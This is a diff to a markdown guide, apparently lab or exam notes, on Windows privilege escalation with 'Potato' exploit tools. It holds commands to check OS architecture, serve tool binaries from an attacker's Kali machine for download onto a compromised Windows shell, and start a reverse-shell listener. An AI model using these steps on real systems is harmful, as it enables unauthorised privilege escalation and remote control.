@@ -11,12 +11,16 @@ powershell [Environment]::Is64BitOperatingSystem
 CMD
 
 ```
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 ```
 
 ```
 wmic os get osarchitecture
 ```
+
+- **`x64-based PC`** means you are running a **64-bit** operating system.
+- **`X86-based PC`** means you are running a **32-bit** operating system.
+
 ## Step 2: Choose Your Exploit Tool
 
 Depending on the Windows version you discovered in Step 1, select your tool from the **"Potato" family**:
@@ -40,7 +44,7 @@ Depending on the Windows version you discovered in Step 1, select your tool from
 Use your Kali machine to host the binary, and pull it down via your active Windows shell using PowerShell's native file transfer capabilities.
 
 ```
- cd ~/Desktop/Tools && python3 -m http.server 80
+ cd ~/Desktop/Tools/Potatoes && python3 -m http.server 80
 ```
 
 POWERSHELL
@@ -85,9 +89,12 @@ If you are using a variation that requires triggering a reverse shell back to yo
 
 On PANE1
 ```
-cd ~/Desktop/Tools && python3 penelope.py -p 9768 -O / --oscp-safe
+cd ~/Desktop/Tools/Potatoes
 ```
 ON PANE2 
+```
+python3 penelope.py -p 9768 -O / --oscp-safe
+```
 
 (x32)
 ```
